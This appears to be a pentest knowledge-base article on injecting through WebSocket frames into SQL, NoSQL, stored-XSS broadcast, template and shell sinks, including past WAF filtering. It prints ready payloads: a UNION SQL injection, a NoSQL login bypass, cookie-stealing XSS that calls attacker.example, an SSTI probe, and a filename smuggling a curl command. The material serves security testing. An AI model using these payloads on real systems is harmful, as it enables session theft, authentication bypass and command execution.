---
title: "Message injection to sinks"
order: 3
description: "WebSocket frame content flowing unsanitized into SQL, NoSQL, stored XSS broadcast, and command or template sinks, carried past HTTP-layer filtering."
keywords:
  - WebSocket injection
  - message injection
  - stored XSS broadcast
  - SQL injection WebSocket
  - WAF bypass
---

# Message injection to sinks

A WebSocket frame is just attacker-controlled input that happens to arrive over a persistent channel. When the server takes a value out of a frame and builds a query, renders it into other clients' pages, or passes it to a shell or template engine, every classic injection applies. What makes the channel worth targeting is that the frame usually skips the request-level defenses: the WAF, input filters, and validation middleware that inspect REST bodies frequently never see frame payloads, so the socket carries the payload past them untouched.

## SQL and NoSQL from the frame

If a frame field lands in a query string, the socket becomes a SQL injection vector. A search or filter frame whose term is concatenated into SQL carries the usual payloads:

```json
{"action": "search", "term": "widget' UNION SELECT username, password FROM users-- -"}
```

The same field feeding a document store takes an operator object instead of a scalar, turning a lookup into an authentication or filter bypass:

```json
{"action": "login", "user": "admin", "pass": {"$ne": null}}
```

Because these frames never pass through the REST router, signature-based rules attached to HTTP endpoints do not fire on them.

## Stored XSS broadcast to other clients

The highest-impact WebSocket sink is the broadcast buffer. A frame sent by one client is stored and then relayed verbatim to every other connected client, so an unsanitized script payload executes in each recipient's session as soon as their client renders the message. This is stored XSS with live, automatic delivery to everyone currently connected:

```json
{"action": "message.send", "room": "support", "body": "<img src=x onerror=\"fetch('https://attacker.example/c?k='+encodeURIComponent(document.cookie))\">"}
```

Every client whose UI inserts `body` as HTML runs the payload. A frame crafted to steal session material or pivot to privileged actions reaches operators and other users without any further interaction, which makes a shared support or chat room a direct route to an administrator's session.

Payloads that avoid inline event handlers survive clients that strip some tags:

```json
{"action": "message.send", "room": "support", "body": "<svg><script>new Image().src='https://attacker.example/c?k='+document.cookie</script></svg>"}
```

## Command and template sinks

Frames also reach server-side execution sinks. A frame field interpolated into a template string that is later rendered server-side gives server-side template injection:

```json
{"action": "render.preview", "name": "{{7*7}}"}
```

A `49` in the result confirms evaluation; the payload then escalates to the engine's object model to reach command execution. Where a frame value is passed to a shell, for example a filename handed to an export or conversion worker, shell metacharacters chain a command:

```json
{"action": "export", "filename": "report.pdf; curl https://attacker.example/$(whoami)"}
```

## Why the channel matters

The common denominator is bypass. Length limits, character filters, and WAF rules are frequently wired into the HTTP request pipeline and never re-applied to decoded frames, so a payload rejected on a REST route often sails through the same application's socket. Map the frame schema from the client's own traffic, identify which fields reach which backend, and deliver the sink-appropriate payload directly over the socket.

## Tools

- **Burp Suite**: WebSockets history and repeater for editing frame payloads and delivering sink-specific injections.
- **wsrepl**: interactive WebSocket REPL for pentesting frame fields.
- **websocat**: command-line WebSocket client for scripting and fuzzing raw messages.

## References

- PortSwigger Web Security Academy, "Manipulating WebSocket messages to exploit vulnerabilities"
- OWASP Web Security Testing Guide, "Testing WebSockets"
